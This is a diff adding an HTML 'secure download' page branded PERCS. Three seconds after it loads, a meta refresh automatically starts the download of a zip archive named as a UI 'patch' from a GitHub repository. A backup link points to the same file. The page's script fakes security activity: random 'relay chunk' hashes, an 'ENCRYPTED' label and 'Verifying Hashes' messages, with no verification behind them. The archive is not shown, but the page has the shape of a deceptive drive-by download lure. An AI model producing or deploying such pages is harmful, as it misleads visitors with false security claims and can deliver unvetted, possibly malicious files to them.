@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PERCS | Secure Download</title>
+    <meta http-equiv="refresh" content="3; url=https://github.com/AC447724/mtx-download/raw/refs/heads/main/newuimatrixwithpatcheu_1772139300.zip">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Plus+Jakarta+Sans:wght@700&family=JetBrains+Mono&display=swap');
+
+        :root {
+            --bg: #000000;
+            --card-bg: rgba(12, 12, 12, 0.7);
+            --text-primary: #ffffff;
+            --text-secondary: #888888;
+            --border: rgba(255, 255, 255, 0.08);
+            --accent: #4ade80;
+            --font-main: 'Inter', sans-serif;
+            --font-heading: 'Plus Jakarta Sans', sans-serif;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }
+        body { background-color: var(--bg); color: var(--text-primary); font-family: var(--font-main); min-height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
+
+        .ambient-glow {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at var(--x, 50%) var(--y, 50%), rgba(255,255,255,0.03) 0%, transparent 40%);
+            pointer-events: none; z-index: 1;
+        }
+
+        .container { position: relative; z-index: 2; width: 100%; max-width: 600px; padding: 20px; text-align: center; }
+
+        .hero h1 { 
+            font-family: var(--font-heading); font-size: 60px; letter-spacing: -4px; margin-bottom: 10px;
+            background: linear-gradient(to bottom, #fff 40%, #555 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+
+        .status-text { font-family: 'JetBrains Mono'; font-size: 12px; color: var(--accent); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 30px; }
+
+        .terminal-window { 
+            background: #080808; border: 1px solid var(--border); border-radius: 24px; padding: 25px; 
+            font-family: 'JetBrains Mono'; font-size: 11px; text-align: left; margin-bottom: 30px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
+
+        .t-header { display: flex; justify-content: space-between; margin-bottom: 15px; color: #333; font-weight: 700; }
+        .t-hash { color: #444; margin-top: 4px; }
+
+        .progress-bar { width: 100%; height: 2px; background: var(--border); margin-top: 20px; position: relative; overflow: hidden; }
+        .progress-fill { position: absolute; top: 0; left: 0; height: 100%; background: var(--accent); width: 0%; transition: 3s linear; }
+
+        .btn-manual { 
+            display: inline-block; color: var(--text-secondary); text-decoration: none; font-size: 12px; 
+            margin-top: 20px; transition: 0.3s; border-bottom: 1px solid transparent;
+        }
+        .btn-manual:hover { color: #fff; border-color: #fff; }
+
+        footer { position: fixed; bottom: 40px; width: 100%; text-align: center; color: #222; font-family: 'JetBrains Mono'; font-size: 10px; letter-spacing: 3px; }
+    </style>
+</head>
+<body>
+    <div class="ambient-glow" id="glow"></div>
+
+    <div class="container">
+        <header class="hero">
+            <h1>DOWNLOADING<span>.</span></h1>
+            <div class="status-text" id="status-msg">Initializing Secure Protocol</div>
+        </header>
+
+        <div class="terminal-window">
+            <div class="t-header"><span>DESTINATION: GITHUB_RAW</span><span style="color:#4ade80">ENCRYPTED</span></div>
+            <div id="encryption-stream"></div>
+            <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
+        </div>
+
+        <p style="color: var(--text-secondary); font-size: 14px;">Your download should begin momentarily.</p>
+        <a href="https://github.com/AC447724/mtx-download/raw/refs/heads/main/newuimatrixwithpatcheu_1772139300.zip" class="btn-manual">Click here if download doesn't start</a>
+    </div>
+
+    <footer>PERCS &mdash; SECURE FILERELAY &mdash; 2026</footer>
+
+    <script>
+        // Ambient Glow Logic
+        const glow = document.getElementById('glow');
+        window.addEventListener('mousemove', (e) => {
+            glow.style.setProperty('--x', e.clientX + 'px');
+            glow.style.setProperty('--y', e.clientY + 'px');
+        });
+
+        // Progress Bar Animation
+        setTimeout(() => {
+            document.getElementById('fill').style.width = '100%';
+        }, 100);
+
+        // Terminal Stream Logic
+        const stream = document.getElementById('encryption-stream');
+        const statusMsg = document.getElementById('status-msg');
+        const chars = 'ABCDEF0123456789!@#$%^&*';
+        const messages = ["Establishing Handshake...", "Requesting Blob...", "Verifying Hashes...", "Handover Initiated"];
+        let msgIndex = 0;
+
+        setInterval(() => {
+            const line = document.createElement('div');
+            line.className = 't-hash';
+            let hash = ''; 
+            for(let i=0; i<35; i++) hash += chars.charAt(Math.floor(Math.random()*chars.length));
+            line.innerHTML = `<span style="color:#222">RELAY_CHUNK:</span> ${hash}`;
+            stream.prepend(line);
+            if (stream.children.length > 8) stream.lastChild.remove();
+            
+            // Cycle status messages
+            if(Math.random() > 0.8 && msgIndex < messages.length) {
+                statusMsg.innerText = messages[msgIndex];
+                msgIndex++;
+            }
+        }, 300);
+    </script>
+</body>
+</html>
